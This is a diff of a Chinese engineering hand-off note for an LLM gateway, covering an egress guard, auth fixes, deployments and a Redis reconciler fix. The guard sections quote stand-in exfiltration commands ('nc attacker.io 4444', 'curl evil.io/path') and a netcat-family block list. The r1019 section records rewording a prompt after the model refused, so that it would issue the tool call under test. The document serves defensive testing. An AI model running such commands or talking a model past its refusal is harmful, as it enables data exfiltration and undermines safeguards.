@@ -152,12 +152,30 @@
   主机**（`pkg@1.2.3` 的 `4.17.21`、`main.py` 都不是）。判据见
   `TestR1017VersionSpecsAndScriptArgsAreNotDestinations`，谁再往提取器里加
   「长得像主机」的形态会先撞上它。
-  **残留缺口**：`nc attacker.io 4444`、`curl evil.io/path`（无 scheme）仍放行。
+  - ~~**残留缺口 `nc attacker.io 4444`**~~ —— **r1019 已按动词表收口**。
+    用 `netcatFamilyVerbs = {nc, ncat, netcat, telnet, socat}` 封闭集 + **命令行首个
+    字段**锚定 + 「主机样 token + 纯数字端口」，误伤面从「与脚本调用不可区分」降到 0
+    （实测 0/19 误伤、7/7 拦截，含 r1016/r1017 打断的全部 12 条样本）。
+    **动词表与形态白名单不是一回事**：它枚举的是命令本身，`node`/`python3`/`ruby`
+    压根不进这条分支。flag 一律跳过而不判断 flag 语义（`-w 3` 里那个 `3` 不是端口，
+    判据是**位置**）。只认显式端口，`telnet attacker.io`（默认 23）**不覆盖**，
+    作为残留如实记录。判据 `security/sanitize/r1019_netcat_egress_test.go`（6 条，
+    含动词表封闭性钉子），变异验证 6/6 变红。
+  - **残留缺口（仍在）**：`curl evil.io/path`（无 scheme、无端口）放行。它与
+    `cat README.md`、`pip install -r requirements.txt` 结构上不可区分，同属形态枚举
+    的禁区，不要试图收口。
 - ~~**email 形状的 `user@host` 误阻断内网目标**~~：`ssh deploy@build.corp.internal`
   整条 `output_policy_blocked`，而 `ssh ops@10.24.7.91` 放行——**同一操作，写 IP
   放行、写内网域名阻断**，与 dc63f19ff 同构。**r1017 已修**：豁免按**类型**分派，
   邮箱的主机部分交回主机可达性判定（`isNonExfiltrationFragment` 单一入口）。
-- ~~**`/v1/models` 对任意 `sk-` 字符串开放**~~：`Bearer sk-totally-bogus` 能拿到
+- - ~~**`/v1/completions` 鉴权失败返回 HTTP 200**~~ —— **2026-10-12 实测推翻，
+  该端点无缺陷**。原结论是取证错误：探针发的是 **GET**，命中的是静态提示处理器
+  （`{"message":"Chat completions endpoint is available...","status":"ok"}`），
+  与 POST 的鉴权路径无关。分离方法后：POST `/v1/completions` 与
+  POST `/v1/chat/completions` 均正确返 401 `invalid_key`，匿名 GET 被中间件 401。
+  **教训**：从「看到一个异常响应」到「这是缺陷」之间隔着变量隔离，探针必须逐个
+  控制 HTTP 方法 / 路径 / 凭据再下结论。
+~~**`/v1/models` 对任意 `sk-` 字符串开放**~~：`Bearer sk-totally-bogus` 能拿到
   全量 615 个模型清单，同一 token 在 `/v1/chat/completions` 上正确 401。
   **根因是委托链断了一节**：`middleware/auth_mw.go` 规定 sk-* 由各 handler 自行
   调 `KeyVerifier`（Rule 20 §2），`ModelsHandler` 从未接上，中间件为内部调用者开
@@ -206,34 +224,45 @@
 在本地任务注册表中已不存在（not found），无法回读其输出——按批判原则，
 它们的「succeeded」状态**不得**被转述为「已读取并确认」。
 
-### 下一轮提示词（2026-10-11 晚间审计轮更新）
+### 下一轮提示词（2026-10-12 深夜轮更新）
 
-1. **r1016/r1017 已随 2537/2539 上线（16:34，并行会话部署）——下轮对生产复验**：
-   `/v1/models` 带伪造 token 必须 401；`ssh ops@10.24.7.91 uptime` 与
-   `ssh ops@内网域名 uptime` 同放行；公网域名外传仍阻断。另验
-   12272e57c 的效果：probe 风暴应消失（此前 credential 19 连续失败 1058 次
-   仍被周期重探），`node_probe_state` 里 EOL 凭据应保持 ready、仅 binding 摘除。
-   蓝绿端口看 `/opt/llm-gateway-go/run/active-upstream.conf`。
-2. **上游可路由性（口径已修正）**：旧口径「成功率 ~50%」系统计噪音（探针失败 +
-   401 风暴混入），午间复测实况 503≈2.5%、11 时真实成功率约 75%（详见
-   `docs/audit/2026-10-11-154-503-口径修正与漂移清单.md`）。**模型目录漂移仍是
-   实体问题**：12 凭据、96 模型名 404/410。属数据/配置层决策（清退失效绑定 /
-   修模型目录 / 降权重），代码不可解，等用户拍板。**另注意生产
-   `archive_request_logs_default`（42703）是 754 修复前的坏版本，TTL 归档从未
-   工作，重放 754 即修（幂等，步骤在审计文档 §五）**。审计统计一律用热表，
-   别拿父表 `success` 列算比率（8h 滞后）。
-3. **fail-open 占位符透传遗留缺陷**：96 行样本、真值零泄漏、中低危，根因未定位；
+1. ~~r1016/r1017 生产复验~~ **已完成（深夜轮独立复验，非转抄 7d5efa21c）**：
+   154=2547、245=2546 均含 r1016/r1017/r1018；models 伪造 token 401、
+   ssh@IP/内网域名放行、npm install 放行、公网域名 403+`output_policy_blocked`、
+   EOL 凭据 healthy 仅 binding 摘除——全部通过，详见
+   `docs/audit/2026-10-12-深夜轮-r1018复验与拍板执行.md`。
+2. ~~漂移绑定 + archive 42703 两项拍板~~ **已执行（深夜轮）**：漂移绑定清退 228 条
+   （`model_probe_broken` 词汇，双备份表 `bak_20261011_drift_bindings{,_b}` 可逆，
+   残留 0）；archive 42703 发现已被部署链修复（函数体含 gw_session_id），手动
+   触发 `archive_request_logs_default(30)` 成功建出 `request_logs_archive_2026_08`。
+3. ~~深夜轮三项代码收口已推送（394da3d12）待部署~~ **已上线（2026-10-12 凌晨轮）**：
+   EOL 识别按 410 状态码、A2 量具 `/api/admin/anomaly-reporter/stats`、
+   deploy-local 空 web/ refuse 门——随 154=2550-a87a134a / 245=2548-a87a134a
+   上生产；A2 端点未授权 401 实测在场，fake token 401 回归通过。
+4. ~~★ 重部署 154/245 使 UrsmlHealthyKeyReconciler 生效~~ **已完成（凌晨轮）**：
+   154 经 2549→2550 两轮部署、245 由并行会话 2548 部署，两台日志均出现
+   `ursm.v2 healthy-key reconciler started`（interval 1m0s），每轮 repaired
+   24~133 个节点键并在收敛（133→54→38）。两台现同为 a87a134a（含 r1019：
+   命令动词表收口 `nc attacker.io 4444`，实测 403 阻断且 r1018 的
+   `node server.js 8080` 放行无回退）。
+4. **probe_direct_auth_failed 是探针失败主体**（2546 上线后 30min 内 204 条，
+   集中在 8/18/19 等凭据）——凭据 key 疑似真死，数据/配置层清退决策待 owner。
+   失效 sk-* key 持有方通知（漂移文档 §三）仍未落地。审计统计一律用热表
+   `request_logs_hot` 或按 `error_kind` 细分，别拿父表 `success` 列算比率。
+5. **fail-open 占位符透传遗留缺陷**：96 行样本、真值零泄漏、中低危，根因未定位；
    推进需在 fail-open 分支加结构化日志 + 收集真实流量 + 另行发布授权。
-4. **还原半程**：601,914 行 `original_encrypted` 全 NULL。若用户要还原功能，
+6. **还原半程**：601,914 行 `original_encrypted` 全 NULL。若用户要还原功能，
    决策点是把 `db_sink.go` 加解密读取方（新代码）而不是配密钥（无读取方，
    配了也白配）。
-5. **晚间审计轮新增遗留**：(a) A2 的 `PermanentlyDisabled`/`PermanentRejections`
-   量具字段无生产消费方，接线到 /metrics 或 admin 端点；(b) deploy-local 对空
-   `web/` 补 refuse 门（52 行坑的代码侧收口）；(c) 12272e57c 的 EOL 措辞
-   contains 匹配脆弱（上游换文案即漏判回凭据级）；(d) 窗口外 8 条 UNMERGED
-   远端分支待维护者裁决（`2026-07-25-realtime-routing-self-heal`、
-   `fix/context-limit-p2-audit`、`fix/hotzone-plan-critical-audit` 等，最后
-   提交均 ≤09-28）。
+7. 窗口外分支：远端 UNMERGED 剩 3 条承载独有内容的
+   （`2026-07-25-realtime-routing-self-heal` 24 篇设计文档归档 +9536 行、
+   `fix/w5-ml-ci-runbook` +327、`fix/w6-monitor-docs` +613），留置待维护者
+   决定合并或放弃；本地分支已清空；已删 5 远端（3 条 patch-id 等价于 main、
+   2 条 3 行过期 README 徽章同步）+ 2 本地已合并。
+8. **批量操作量具坑（新增，判据纪律第 5 条）**：`node_probe_state` 被探针周期
+   并发改写，READ COMMITTED 逐语句快照会在改写窗口读到半写状态（深夜轮第一批
+   清退因此静默漏掉 cred 18/19 的 127 条——预览 234、执行 107，非数据变化）。
+   凡以它为源的批量操作一律 REPEATABLE READ 单快照 + 双时间点复验。
 
 ## 已完成（已推送）
 
@@ -269,11 +298,43 @@
    - **部署轮验证**：2538 上线后 127.0.0.1:8782 / mesh 8782 / mesh 8443
      (caddy) / 公网 443 SNI→252:9443→mesh 8782 四入口全绿，**收尾零孤儿
      进程**（新机制首次实战生效）。
+8. **2026-10-12 深夜轮**（r1018 生产复验 + 两项拍板执行 + 分支裁决），详见
+   `docs/audit/2026-10-12-深夜轮-r1018复验与拍板执行.md`：
+   - 独立复验 2546/245 + 2547/154 全通过（复验矩阵见审计文档 §二）；
+   - 漂移绑定清退 228 条（0 残留，双备份表可逆）；archive 42703 已被部署链
+     修复，手动触发归档验证通过；
+   - 三项代码收口（EOL 按 410 状态码 / A2 admin 端点 / refuse 门）已推送
+     394da3d12，**待下次部署**；
+   - 分支裁决：删 5 远端 + 2 本地，留 3 条独有内容远端；
+   - 新增量具坑：`node_probe_state` 并发改写窗口读半写（判据纪律第 5 条）。
+9. **2026-10-12 r1019 轮**（netcat 系外传缺口收口 + 两台生产上线），详见
+   `docs/audit/2026-10-10-已还原值被输出合规销毁.md` 末尾 r1019 小节：
+   - **245 = `2548-a87a134a`**（8781）、**154 = `2551-a87a134a`**（8781）。
+     两台均含 r1019；**全路径端到端各 14/14 通过**（真实模型 `glm-4.5-flash`、
+     `tool_choice` 强制）。此前 r1018 刻意留下的 `nc attacker.io 4444` 残留缺口已收口。
+   - **假绿实例（判据纪律第 3 条的又一次实证）**：`nc attacker.io 4444` 首轮返 200，
+     看着像没拦住，实为模型在**散文里自行拒绝**、压根没发起 tool call——
+     「看不见」与「没拦」被混为一谈。换顺从措辞后复测 → BLOCK 403。
+     **每次「放行」都要单独判前提是否在场。**
+   - **判别实验**：同一句命令，不给 `tools` → 200 不拦；给 `tools` 且强制调用 →
+     403 `output_policy_blocked`。守卫作用域确认是 **tool 参数**，不是提示词文本。
+   - **部署纪律新增（本轮踩到）**：`scripts/deploy-seamless.sh` **必须用
+     `$HOME/sdk/bash5/bin/bash` 跑**（系统 bash 3.2 的 `${target^^}` 会报
+     bad substitution）。且它在报错前**已经先在远端建好了 deploy.lock**，
+     于是留下一把**孤儿锁**让下一次部署直接失败。判陈旧锁要看
+     `lock/metadata` 的 `started_at` + 持有 pid 是否还活着，不能只看报错文案。
+   - **本机没有 `sops`**，`envs/loader.sh --mode=enc` 解不开 `.env.secrets.enc.yaml`，
+     取 `LLM_GATEWAY_ADMIN_*` 只能从目标机运行时 `/opt/llm-gateway-go/.env` 拿。
+   - 并发会话提醒：154 上曾出现**另一份 checkout 在部署**（seq 2550 已落盘未切流）。
+     **没清活锁**、等它结束后自查版本再部署——否则会把「对方已落盘的 release」
+     误当成「自己已上线」。
 
 
 ## 剩余任务（按依赖顺序）
 
-0. **陈旧分支清理（窗口外遗留，下轮顺手项）**：本地分支 `fix/sanitize-mutation-tolerant-restore`（d47f52703，10-08）已被已合并的 v2（`fix/sanitize-mutation-tolerant-restore-v2`，7cbf65478）取代，远端引用已被 prune——下轮确认后 `git branch -D` 即可。
+~~0. **陈旧分支清理（窗口外遗留，下轮顺手项）**~~ **已完成（2026-10-12 深夜轮）**：
+`fix/sanitize-mutation-tolerant-restore-v2` 与 `fix/sanitize-hop-passthrough`
+均已 `git branch -d` 删除（当时确认已合并），本地仅剩 main。
 
 ### 任务 1 — 编译 / vet / gofmt / 单元测试
 
@@ -443,6 +504,25 @@ bash scripts/apply-db-revision-sequence_test.sh      # rc=0；失败即迁移投
 cd installer && go test ./...                        # rc=0；失败即 installer 同步缺口
 ```
 
+## ⚠️ 部署脚本的 ENVS_ROOT 默认值已过时（2026-10-11 深夜实测踩到）
+
+`scripts/deploy-seamless.sh:163` 的默认值是
+`${HOME}/workspace/ai-native-workspace/envs`，而仓库已迁到
+`ai-native-tools/envs`，直接跑会失败：
+
+```
+✗ envs SSOT loader not found: /Users/niuer/workspace/ai-native-workspace/envs/loader.sh
+```
+
+绕过（**未改共享脚本**，那是部署基础设施 SSOT，改动应由其维护者裁决）：
+
+```bash
+ENVS_ROOT="$HOME/workspace/ai-native-tools/envs" bash scripts/deploy-seamless.sh deploy 245 --seq NNNN
+```
+
+`--seq` 也可能不被采纳（实测传 2538 到 154，release 落成 2547）——**以部署脚本
+回显的 `version=` 为准**，不要拿自己传的 seq 去核对产物目录名。
+
 ## 部署 245 的实操（2026-10-11 全程走通）
 
 ```bash
@@ -500,6 +580,86 @@ checkout 或当时目录状态确有变化（同日 `~/sdk/bash5` 确被清过�
    行为差异：探测成败取决于跑部署的 shell 环境，不在代码。
 3. 2538 起部署收尾多了孤儿网关清扫（见「已完成」2026-10-11 下午审计轮）；
    `run/gateway.build` 是每次部署的构建暂存产物，属正常残留，不用手工清。
+
+---
+
+# 追加：2026-10-11 深夜轮——154 全局变慢根因修复（UrsmlHealthyKeyReconciler）
+
+> 会话时间 2026-10-11 23:29 → 10-12 01:00。用户目标：154 网关响应非常慢，
+> 分析 154 网关 + 252 网关数据库日志，修正后优化 252 数据库，验证后提交推送。
+> **已完成分析、止血、代码修复（含变异验证）、252 DB 优化项核验、提交推送。**
+
+## 根因（端到端证据链，全部实测）
+
+1. **症状**：`/v1/chat/completions` p90=16.8s、p99=889s、max=85 分钟；
+   `router: URSM v2 authoritative view filtered out every candidate` 告警全天上升
+   （15 时 21 条 → 22 时 352 条）。机制：候选全灭后请求进
+   `wait_recovery_window`——30s 间隔、deadline 5 小时（`deadline_remaining_sec:17999`），
+   客户端拿到 200+keepalive 后被一直挂着 = 用户看到的「非常慢」。
+   受灾模型：gpt-6-astra(566)/glm-5.3(482)/claude-opus-5(373)。
+2. **直接原因**：URSM v2（Redis db2，authoritative 模式）里这些健康凭据的
+   节点键缺失/过期。T4 契约：**缺键 = Available=false**（fail-closed 保护拒绝）。
+3. **为什么会缺**（结构性，三件事叠加）：
+   - 2026-09-20 probe-volume 政策（`MarkNodeProbeHealthy`）：每次成功业务请求把
+     node_probe_state 行 park 30 天（`next_retry_at = now() + interval '30 days'`，
+     bg/node_probe.go:1510）——健康对**不再有任何主动探测**。
+   - 节点键只剩请求遥测在写（record_request.lua，priority=10，**分钟级 TTL**）。
+     probeWriteTTLFloor=7h 只作用于探测写，而 park 政策后探测写永不发生。
+   - 流量间隙 > TTL ⇒ 键过期 ⇒ 全灭 ⇒ park 5h；park 期间**无遥测、无探测、无恢复
+     路径**（36h lookback 只覆盖 `cmb.available=FALSE` 的绑定，健康对是盲区），
+     直到每天 ~00:30 integrity_verify 清扫才自愈。**这是死锁式锁死**。
+4. **今日放大器**：15:45:58 一次 `redis_unavailable` recovery（epoch 哈希：
+   recovery_counter=5537、recovered_keys_count=769）用快照覆盖/替换了大量节点键
+   ——此后告警从个位数暴涨。recover 之所以被触发：persist collect 对共享 db2
+   （**170 万键**）做全量 SCAN，30s 预算实测要 12.95–30.40s，频繁 i/o timeout
+   （gateway 日志 `persist collect failed` 多条）。代码注释（cmd/gateway/main.go
+   URSM_V2_REDIS_DB 段）自己就预言了这个代价。
+5. **旁证**：gateway 模式探测全部 401（r1016/r1017 鉴权修复连带，node_probe_runs
+   里 `gateway_ok=f 401` vs `direct_ok=t 200`）；direct 探测不受影响。
+
+## 已落地
+
+1. **止血（生产 Redis，~00:10-00:45）**：按 DB 健康谓词（bindings available +
+   credentials active/ready + providers enabled + nps 无失败）筛出 253 对健康绑定，
+   用 apply_probe.lua 成功语义重写节点键（priority=20，TTL 7h）；其中唯一
+   单凭据无探测覆盖的 gpt-6-astra 单独补写。**效果：告警 100+/10min → 00:41 起 0**。
+2. **代码修复（本提交）**：`bg/ursm_healthy_reconcile.go` +
+   `bg/ursm_healthy_reconcile_test.go` + `cmd/gateway/main.go` 接线（bootstrap 块后）。
+   `UrsmlHealthyKeyReconciler`：默认 60s tick（settings_kv
+   `ursm.healthy_reconcile_interval_seconds`，<=0 关闭），每轮把 **DB 验证健康**
+   的可路由对经 `FilterAndScoreReady`（单条 pipeline，无 SCAN）读视图，
+   对判不可用者走 `ApplyProbeForTenant(success=true)`（与探测同路径：
+   probe 优先级 + 7h TTL floor + manual_hold 让步 + 冷却即恢复）。
+   安全边界：只写 DB 健康对（T4 fail-closed 对无证据对不被打穿）；
+   ready 门关着时整轮跳过；authoritative 模式空租户对跳过。
+   **7 个单测 + 两轮变异验证有牙**（删 Available 过滤→红；绕 ready 门→红；
+   第一版关闸测试因未播种 DB 行是假绿，已修——AGENTS「判据必须在同一层」再+1）。
+3. **252 数据库优化项核验**：`archive_request_logs_default` 实测已含
+   `gw_session_id` 且手动执行成功（42703 已消，幂等重放已被并行会话完成）。
+   其余 PG 负载（analyze_llm_gateway_table_stats 均值 150s×25、session 分析族、
+   MV 刷新）为产品功能非故障，未动。
+
+## 待办（下一轮）
+
+1. ~~**★ 重部署 154/245 网关使 reconciler 生效**~~ **已完成（2026-10-12 凌晨轮）**：
+   154=2550-a87a134a（本会话 2549→2550 两轮）、245=2548-a87a134a（并行会话）。
+   两台日志均出现 `ursm.v2 healthy-key reconciler started`（interval 1m0s），
+   repaired 每轮 24~133 并在收敛；154 部署后 E2E 3/3、245 5/5（含 r1019 的
+   `nc attacker.io 4444` 转阻断）回归全过。
+2. **URSM_V2_REDIS_DB 迁移到独立 db**（代码已支持，注释在 main.go URSM 段）：
+   一并消除 persist SCAN 走 170 万会话键的超时 → redis_unavailable 假恢复
+   的触发源。需要重启 + coverage bootstrap 收敛，留维护者窗口。
+3. 观测：`ursm:v2:meta:epoch` 的 recovery_counter（5537）与
+   `persist collect failed` 频率是本链路的健康表；接线到 /metrics 更好
+   （与已登记的 A2 量具缺口同类）。
+4. 现场残留：Redis db2 有少量键名含 `':'` 引号的乱码节点键
+   （如 `ursm:v2:node:default':'61':'gpt-6-astra`，来源未定，疑似并行会话/脚本；
+   无读方，无害）。凌晨轮尝试顺手清理：`/etc/llm-gateway-go/env` 的
+   `LLM_GATEWAY_REDIS_PASSWORD` 与 `LLM_GATEWAY_REDIS_URL` 内嵌口令对
+   172.16.2.210:6389 均 NOAUTH——网关运行时凭据与该实例的认证不对应，
+   清理需维护者提供正确凭据，未强行继续。
+5. gateway 模式探测 401（r1017 连带）与 EOL 措辞 contains 脆弱（已登记项）
+   未动；glm-5.2 系 410、sensenova 系等模型目录漂移仍待 owner 拍板。
 
 ---
 
